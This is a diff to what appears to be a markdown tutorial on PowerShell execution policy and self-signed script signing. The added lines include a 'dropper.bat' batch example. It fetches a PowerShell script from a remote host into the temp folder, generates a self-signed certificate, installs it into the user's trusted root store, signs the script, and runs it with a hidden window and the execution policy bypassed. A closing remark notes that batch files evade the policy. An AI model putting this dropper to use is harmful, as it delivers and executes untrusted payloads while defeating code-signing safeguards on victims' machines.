@@ -15,8 +15,13 @@ Start-Sleep -Seconds 3
 
 ```
 
-#### Lets Run our Script (With PS ExecutionPolicy set to '[AllSigned](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)')
-Requires that all scripts and conf files are signed by a trusted publisher, including scripts written on the local computer.
+#### Lets set 'Target' PS Execution Policy to 'AllSigned' to test the script (no need admin rigths)
+`Set-ExecutionPolicy AllSigned -Scope CurrentUser`
+
+<br />
+
+#### Lets Run our Script (With PS ExecutionPolicy set to 'AllSigned')
+[AllSigned = Requires that all scripts and configuration files are signed by a trusted publisher, including scripts written on the local computer.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)
 ![sd11](https://user-images.githubusercontent.com/23490060/72687408-6a1e7180-3af5-11ea-8d14-c0ffa221468d.png)
 
 <br />
@@ -56,8 +61,8 @@ Set-AuthenticodeSignature -FilePath $env:userprofile\Desktop\my_posh_script.ps1 
 ![dsf](https://user-images.githubusercontent.com/23490060/72689414-1158d400-3b09-11ea-9d6a-449a224c1952.png)
 #### After the script beeing signed, it will be append one certificate {code block} inside the PS script:
 ![po1](https://user-images.githubusercontent.com/23490060/72687557-d2ba1e00-3af6-11ea-840b-702ccbe4bc73.png)
-#### Running the script with PS Execution-Policy set to '[AllSigned](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)'
-Requires that all scripts and conf files are signed by a trusted publisher, including scripts written on the local computer.
+#### Running the script with PS Execution-Policy set to 'AllSigned'
+[AllSigned. Requires that all scripts and configuration files are signed by a trusted publisher, including scripts written on the local computer.](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7)
 ![sdff](https://user-images.githubusercontent.com/23490060/72687601-6a1f7100-3af7-11ea-8f95-9d611d8867b2.png)
 
 ---
@@ -70,13 +75,25 @@ Requires that all scripts and conf files are signed by a trusted publisher, incl
 That meens if we port the PS script to a remote machine it will not execute, because remote machine does not contain
 this certificate in there certificate store ...
 
+#### Revert Target System to 'Default' Settings. (non admin privs requiered)
+`Set-ExecutionPolicy Restricted -Scope CurrentUser`
+
+---
+
 <br />
 
-#### Automation Example:
+#### Batch (dropper.bat) Automation Example:
 ```
-# Code to digitally sign one PS script
-$cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My
-Move-Item -Path $cert.PSPath -Destination "Cert:\CurrentUser\Root"
-Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert
-```
+:: Code to Download our PS script to 'tmp' remote folder
+powershell -C (New-Object Net.WebClient).DownloadFile('http://192.168.1.71/my_posh_script.ps1', '$env:tmp\my_posh_script.ps1');
+timeout /T 2 >nul
 
+:: Code to digitally sign Our Downloaded PS script (my_posh_script.ps1)
+powershell $cert = New-SelfSignedCertificate -Subject "My Code Signing Certificate” -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\CurrentUser\Root";Set-AuthenticodeSignature -FilePath $env:tmp\my_posh_script.ps1 -Certificate $cert;
+timeout /T 2 >nul
+
+:: Code to Execute our Downloaded script
+powershell -Execution Bypass -WindowStyle Hidden -NoProfile -File "$env:tmp\my_posh_script.ps1"
+```
+**Remark:** This Dropper.bat can Download-PS-Script/Build-Cert/Sign-PS-Script/Execute-PS-Script because the Policy
+its by Default set to powershell Scripts Only (this policy does not affect batch scripts from running and executing all of this)..
